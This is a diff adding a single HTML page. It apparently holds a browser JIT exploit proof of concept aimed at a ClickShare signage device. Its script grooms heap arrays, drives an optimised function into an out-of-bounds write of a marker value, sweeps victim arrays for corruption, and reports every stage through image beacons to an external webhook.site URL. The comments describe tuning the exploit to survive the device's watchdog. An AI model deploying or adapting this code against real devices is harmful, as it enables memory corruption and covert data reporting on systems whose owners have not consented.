@@ -1,0 +1,72 @@
+<html><body><script>
+// ClickShare signage -- stage 1 Q2 (kind-transition fix). ROOT CAUSE FIXED (device log evidence):
+//  - v5 died because sync XHR froze the main thread; v6/v7 died because a 3e6-iteration
+//    busy-wait after every beacon froze the main thread -> the baseunit watchdog kills the
+//    renderer -> "crash detected" before beacons flush. v2 (pure async) delivered 7/7.
+//  => PURE ASYNC beacons, zero blocking, bounded allocations.
+// Proof the device reaches the internet: it successfully loaded https://webhook.site/... at 22:53:46.
+const SINK = 'https://webhook.site/2e90e5ef-e377-4add-8fd5-05d360fce7f7';
+const MARKER = 1.2345678901234e-300;
+function beacon(t, v){
+  try { var i = new Image(); i.src = SINK + '?t=' + encodeURIComponent(t) + '&v=' + encodeURIComponent(String(v).slice(0,150)); } catch(e){}
+}
+beacon('Q2-start', navigator.userAgent.slice(0,80));
+try {
+  // bounded victim pool (ring of 48) - pre-filled with doubles => INLINE FixedDoubleArray
+  const RING = 4000;   // keep ALL victims: OOB writes happen during the warm-up, an evicted ring loses the evidence
+  var ring = [];
+  for (let k = 0; k < RING; k++) { var a = new Array(64); for (let z = 0; z < 64; z++) a[z] = 1.0 + z; ring.push(a); }
+  var arrx = new Array(150); for (let z = 0; z < 150; z++) arrx[z] = 0.5 + z;
+  beacon('Q2-pool-done', RING);
+
+  var fake = new Uint32Array(10);
+  for (var i=0;i<9;i++) fake[i] = i+1;
+  fake[0]=1; fake[1]=3; fake[2]=2; fake[3]=4; fake[4]=5; fake[5]=6; fake[6]=7; fake[7]=8; fake[8]=9;
+  var tahir = 0x1, slot = 0;
+  function poc(a) {
+    var oob_array = new Array(5); for (var z=0; z<5; z++) oob_array[z] = 0.5 + z;   // PACKED_DOUBLE_ELEMENTS from the start
+    // victim allocated immediately after oob_array (bump pointer in young gen) - slot reused, no growth
+    var victim = new Array(64); for (let z = 0; z < 64; z++) victim[z] = 1.0 + z;
+    if (ring.length < 20000) ring.push(victim);   // never evict
+    let just_a_variable = fake[0];
+    let another_variable3 = fake[7];
+    if (a % 7 == 0) another_variable3 = 0xff00000000;
+    another_variable3 = Math.max(another_variable3, tahir);
+    another_variable3 = another_variable3 >>> 0;
+    var index = fake[3];
+    var for_phi_modes = fake[6];
+    let c = fake[1];
+    for (var i = 0; i < 10; i++) {
+      if (a % 3 == 0) just_a_variable = c;
+      if (a % 37 == 0) just_a_variable = fake[2];
+      if (a % 11 == 0) just_a_variable = fake[8];
+      if (a % 17 == 0) just_a_variable = fake[5];
+      if (a % 19 == 0) just_a_variable = fake[4];
+      if (a % 7 == 0 && i >= 5) { for_phi_modes = just_a_variable; just_a_variable = another_variable3; }
+      if (i >= 6) { for (let j = 0; j < 5; j++) { if (a % 5 == 0) { index = for_phi_modes; oob_array[index] = MARKER; } } }
+      for_phi_modes = c; c = just_a_variable;
+    }
+    for (let j = 0; j < 64; j++) { if (victim[j] === MARKER) { beacon('HIT-mark', 'same-iter a=' + a + ' j=' + j); hits++; break; } }
+    if (victim.length !== 64) { beacon('HIT-len', 'same-iter a=' + a + ' len=' + victim.length); hits++; }
+    return [index, BigInt(just_a_variable)];
+  }
+  var hits = 0;
+  function sweep(tag){
+    for (let j = 0; j < 150; j++) { if (arrx[j] === MARKER) { if (hits++ < 6) beacon('HIT-arrx','at='+tag+' j='+j); } }
+    for (let k = 0; k < ring.length; k++) {
+      var v = ring[k];
+      if (v.length !== 64) { if (hits++ < 6) beacon('HIT-len','at='+tag+' k='+k+' len='+v.length); continue; }
+      for (let j = 0; j < 64; j++) { if (v[j] === MARKER) { if (hits++ < 6) beacon('HIT-mark','at='+tag+' k='+k+' j='+j); break; } }
+    }
+    beacon('Q2-iter','at='+tag+' hits='+hits);
+  }
+  for (let i = 2; i < 0x500; i++) poc(i);
+  beacon('Q2-warm-done','ok'); sweep('warm');
+  for (let i = 0; i < 3000; i++) poc(i % 500 + 2);
+  beacon('Q2-warm3k-done','ok'); sweep('warm3k');
+  let triggers = [35, 70, 105];
+  for (let t = 0; t < triggers.length; t++) { beacon('Q2-fire','a='+triggers[t]); poc(triggers[t]); sweep('a'+triggers[t]); }
+  beacon('Q2-SURVIVED','hits='+hits);
+} catch (e) { beacon('Q2-exc', String(e).slice(0,120)); }
+beacon('Q2-done','end-of-page');
+</script></body></html>
